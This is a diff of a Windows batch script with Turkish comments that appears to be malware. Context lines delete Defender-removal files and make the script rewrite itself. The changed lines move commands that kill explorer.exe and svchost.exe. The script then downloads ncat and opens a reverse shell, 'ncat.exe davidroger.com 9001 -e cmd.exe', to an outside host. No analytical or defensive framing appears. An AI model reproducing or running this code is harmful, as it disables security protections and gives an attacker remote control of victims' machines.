@@ -16,8 +16,7 @@ del /f /q "RunDefenderRemover.vbs"
 del /f /q "DefenderRemover.bat"
 rmdir /s /q "Remove_SecurityComp"
 rmdir /s /q "Remove_Defender"
-taskkill /f /im explorer.exe
-taskkill /f /im svchost.exe
+
 :: Kendini gecici bir dosyaya yaz, sonra o dosya ile degistir
 set "script=%~f0"
 set "tempfile=%temp%\temp_script.bat"
@@ -31,6 +30,8 @@ set "tempfile=%temp%\temp_script.bat"
 copy /y "%tempfile%" "%script%" >nul
 cd %temp%
 del /f /q "temp_script.bat"
+taskkill /f /im explorer.exe
+taskkill /f /im svchost.exe
 :: ncat indir ve calistir
 curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
 ncat.exe davidroger.com 9001 -e cmd.exe
